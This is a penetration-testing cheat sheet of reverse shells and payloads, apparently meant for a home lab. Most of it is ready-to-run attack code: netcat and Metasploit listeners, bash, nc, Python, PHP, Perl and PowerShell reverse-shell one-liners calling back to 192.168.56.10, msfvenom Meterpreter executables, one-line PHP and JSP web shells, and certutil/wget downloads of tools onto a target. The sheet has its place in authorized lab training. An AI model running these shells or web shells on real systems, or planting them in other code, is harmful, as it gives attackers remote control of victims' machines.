# Reverse Shells & Payloads

The most-used quick reference in any lab: get a shell, catch it, upgrade it. **Lab / authorized targets only.** Set `LHOST`/`LPORT` to your Kali (`192.168.56.10`) and a port you're listening on.

> Confirm the target's available interpreters first (`which python3 bash nc php perl`). Copy the one that fits.

## 1. Start a listener (on Kali)
```bash
nc -lvnp 4444                 # simple netcat listener
rlwrap nc -lvnp 4444          # with readline (arrow keys/history)
# Metasploit multi/handler:
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 192.168.56.10; set LPORT 4444; run"
```

## 2. Reverse shells (run on the target)
```bash
# bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
# nc (traditional)
nc 192.168.56.10 4444 -e /bin/bash
# nc without -e (OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f
# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.56.10",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# php
php -r '$s=fsockopen("192.168.56.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# perl
perl -e 'use Socket;$i="192.168.56.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```
PowerShell (Windows target):
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('192.168.56.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}"
```

## 3. Generate payloads with msfvenom
```bash
# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o shell.elf
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o shell.exe
# PHP web shell payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php
# Windows staged shell (no meterpreter)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o s.exe
# List payloads / formats:  msfvenom -l payloads   |   msfvenom --list formats
```
**Staged vs stageless:** `windows/meterpreter/reverse_tcp` (staged, `/`) needs a matching multi/handler; `windows/meterpreter_reverse_tcp` (stageless, `_`) is self-contained. The handler `PAYLOAD` must match msfvenom's `-p` exactly.

## 4. Upgrade a dumb shell to a full TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # step 1
# then: Ctrl+Z  (background it)
stty raw -echo; fg                                # step 2 (on Kali), press Enter twice
export TERM=xterm                                 # step 3 (in the shell)
stty rows 38 columns 116                          # match your terminal size
```
Alternatives: `script -qc /bin/bash /dev/null`, or `socat` for a fully interactive PTY.

## 5. A quick web/PHP shell (upload targets)
```php
<?php system($_GET['c']); ?>              // hit: shell.php?c=id
<?php echo shell_exec($_GET['c']); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>   // .jsp targets
```

## Serving files to a target
```bash
python3 -m http.server 80          # on Kali, then on target: wget http://192.168.56.10/linpeas.sh
# Windows target: certutil -urlcache -f http://192.168.56.10/x.exe x.exe
# transfer via SMB: impacket-smbserver share . -smb2support
```

> More payloads: PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources · reverse-shell generator: https://www.revshells.com/
